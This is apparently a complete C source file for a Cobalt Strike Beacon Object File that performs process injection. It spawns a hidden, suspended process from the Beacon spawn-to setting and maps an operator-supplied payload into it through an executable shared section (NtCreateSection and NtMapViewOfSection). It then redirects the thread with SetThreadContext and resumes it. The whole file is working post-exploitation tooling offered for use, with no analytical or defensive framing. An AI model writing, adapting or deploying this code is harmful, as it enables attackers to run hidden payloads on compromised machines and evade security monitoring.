#include <windows.h>
#include <ntdef.h>
#include <ntstatus.h>
#include "beacon.h"

DECLSPEC_IMPORT WINBASEAPI VOID WINAPI KERNEL32$Sleep(DWORD dwMilliseconds);

DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$CreateProcessA(
    LPCSTR                lpApplicationName,
    LPSTR                 lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    WINBOOL               bInheritHandles,
    DWORD                 dwCreationFlags,
    LPVOID                lpEnvironment,
    LPCSTR                lpCurrentDirectory,
    LPSTARTUPINFOA        lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
);

DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$GetThreadContext(
    HANDLE    hThread,
    LPCONTEXT lpContext
);

DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$SetThreadContext(
    HANDLE          hThread,
    const CONTEXT* lpContex
);

DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$ResumeThread(HANDLE hThread);

DECLSPEC_IMPORT WINBASEAPI NTSTATUS WINAPI NTDLL$NtCreateSection(
    PHANDLE            SectionHandle,
    ULONG              DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER     MaximumSize,
    ULONG              PageAttributess,
    ULONG              SectionAttributes,
    HANDLE             FileHandle
);

DECLSPEC_IMPORT WINBASEAPI NTSTATUS WINAPI NTDLL$NtMapViewOfSection(
    HANDLE          SectionHandle,
    HANDLE          ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR       ZeroBits,
    SIZE_T          CommitSize,
    PLARGE_INTEGER  SectionOffset,
    PSIZE_T         ViewSize,
    DWORD           InheritDisposition,
    ULONG           AllocationType,
    ULONG           Win32Protect
);

DECLSPEC_IMPORT WINBASEAPI NTSTATUS WINAPI NTDLL$NtUnmapViewOfSection(
    HANDLE  ProcessHandle,
    PVOID   BaseAddress
);

/* is this an x64 BOF */
BOOL is_x64() {
#if defined _M_X64
    return TRUE;
#elif defined _M_IX86
    return FALSE;
#endif
}

void go(char* args, int alen, BOOL x86) {
    //BeaconPrintf(CALLBACK_OUTPUT, "Starting...\n");

    datap parser;
    short ignoreToken;
    char* dllPtr;
    int   dllLen;

    /* Extract the arguments */
    BeaconDataParse(&parser, args, alen);
    ignoreToken = BeaconDataShort(&parser);
    dllPtr = BeaconDataExtract(&parser, &dllLen);

    STARTUPINFOA startup_info;
    PROCESS_INFORMATION process_info;

    /* zero out these data structures */
    __stosb((void*)&startup_info, 0, sizeof(STARTUPINFO));
    __stosb((void*)&process_info, 0, sizeof(PROCESS_INFORMATION));

    startup_info.dwFlags = STARTF_USESHOWWINDOW;
    startup_info.wShowWindow = SW_HIDE;
    startup_info.cb = sizeof(STARTUPINFO);

    char spawnTo[1024];
    BeaconGetSpawnTo(x86, spawnTo, 1024);

    //BeaconPrintf(CALLBACK_OUTPUT, "Spawn to: %s\n", spawnTo);

    WINBOOL success = KERNEL32$CreateProcessA(
        NULL,
        spawnTo,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW | CREATE_SUSPENDED,
        NULL,
        NULL,
        &startup_info,
        &process_info
    );

    if (!success) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to spawn process");
        BeaconCleanupProcess(&process_info);
        return;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "Created process\n");

    HANDLE hSection;
    LARGE_INTEGER szSection = { dllLen };
    NTSTATUS status = NTDLL$NtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        &szSection,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
        NULL
    );

    if (status != STATUS_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to create section");
        BeaconCleanupProcess(&process_info);
        return;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "Created section\n");

    PVOID hLocalAddress = NULL;
    SIZE_T viewSize = 0;
    status = NTDLL$NtMapViewOfSection(
        hSection,
        (HANDLE)-1,
        &hLocalAddress,
        (ULONG_PTR)NULL,
        0,
        NULL,
        &viewSize,
        1,
        0,
        PAGE_EXECUTE_READWRITE
    );

    if (status != STATUS_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to map local view of section");
        BeaconCleanupProcess(&process_info);
        return;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "Mapped local view of section\n");

    RtlCopyMemory(hLocalAddress, dllPtr, dllLen);

    PVOID hRemoteAddress = NULL;
    status = NTDLL$NtMapViewOfSection(
        hSection,
        process_info.hProcess,
        &hRemoteAddress,
        (ULONG_PTR)NULL,
        0,
        NULL,
        &viewSize,
        1,
        0,
        PAGE_EXECUTE_READWRITE
    );

    if (status != STATUS_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to map remote view of section");
        BeaconCleanupProcess(&process_info);
        return;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "Mapped remote view of section\n");

    CONTEXT context;

    __stosb((void*)&context, 0, sizeof(CONTEXT));
    context.ContextFlags = CONTEXT_INTEGER;

    success = KERNEL32$GetThreadContext(process_info.hThread, &context);

    if (!success) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to get remote thread context");
        BeaconCleanupProcess(&process_info);
        return;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "Got thread context\n");

#ifdef _WIN64
    context.Rcx = (DWORD64)hRemoteAddress;
#else
    context.Ecx = (DWORD)hRemoteAddress;
#endif
    success = KERNEL32$SetThreadContext(process_info.hThread, &context);

    if (!success) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to set remote thread context");
        BeaconCleanupProcess(&process_info);
        return;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "Set thread context\n");

    DWORD end = KERNEL32$ResumeThread(process_info.hThread);

    if (end == -1) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to resume remote thread");
        BeaconCleanupProcess(&process_info);
        return;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "Resumed thread\n");

    status = NTDLL$NtUnmapViewOfSection(
        (HANDLE)-1,
        hLocalAddress
    );

    if (status != STATUS_SUCCESS)
        BeaconPrintf(CALLBACK_ERROR, "Failed to unmap local view of section");
    //BeaconPrintf(CALLBACK_OUTPUT, "Unmapped local view of section\n");

    BeaconCleanupProcess(&process_info);
}

void gox86(char* args, int alen) {
    go(args, alen, TRUE);
}

void gox64(char* args, int alen) {
    go(args, alen, FALSE);
}

